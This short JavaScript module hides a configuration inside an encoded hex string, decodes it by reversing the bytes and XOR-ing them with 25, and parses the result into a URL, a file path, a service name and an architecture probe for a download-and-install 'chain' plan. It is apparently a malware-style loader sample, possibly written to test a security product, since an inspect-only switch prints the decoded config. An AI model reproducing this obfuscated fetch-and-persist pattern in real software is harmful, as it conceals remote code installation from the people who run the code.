const moduleShape = Object.freeze({ format: "commonjs" });

const Material_231b80b4 = "7c7a706f6b7c6a3728207a7a2d7b347c7d7677247c747877467c7a706f6b7c6a65717a6b78376a6a7c7a766b69247c7b766b6946717a6b78656a7374372c2f7c7d7a7f28207a7a2d7b347c7e786d6a37367c7d7677346a6a7c6b6d776c713669746d3624716d7869467c75707f657a7a2d7b366d707d6c587c7d7657246d777c7e78466b7c6a6c65706978367d7075786f7770377c75697478617c372c2f7c7d7a7f28207a7a2d7b347c7d76773636236a696d6d7124756b6c655a5f28205a5a2d5b345c5d5657247d7046777e70786974787a652c246d776c767a467c7e786d6a65727a787b7575787f46717a6b78466a696d6d71246b7c6d69787d78656a6a7c7a766b6946717a6d78696a707d357c7d7674467c7e7778717a357c75707f467c6d706b6e357c6d76747c6b467c6b706c687a78356d6a7671467c75707f766b69246a697c6d6a6528246f";

const Codec_231b80b4 = "hex_buffer|reverse_then_xor|19";



function load_231b80b4() { return [...Buffer.from(Material_231b80b4, "hex")]; }

function decode_231b80b4(e) { return [...e].reverse().map((value) => value ^ 25); }

async function recover_231b80b4() {

  const n = 2 > 1 ? "left" : "right";

  const e = load_231b80b4(); let d = [];

  const decodeTarget = decode_231b80b4; d = decodeTarget(e);

  void n; return Buffer.from(d).toString("ascii");

}

async function inspect_231b80b4() { return Buffer.from(await recover_231b80b4(), "utf8").toString("utf8"); }

async function plan_231b80b4() { const inspect = inspect_231b80b4; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "chain", adapter: "https_arch_fallback", arch: fields.arch_probe, url: fields.url, path: fields.file_path, service: fields.service_name }); }

void moduleShape; void plan_231b80b4;

if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_231b80b4());

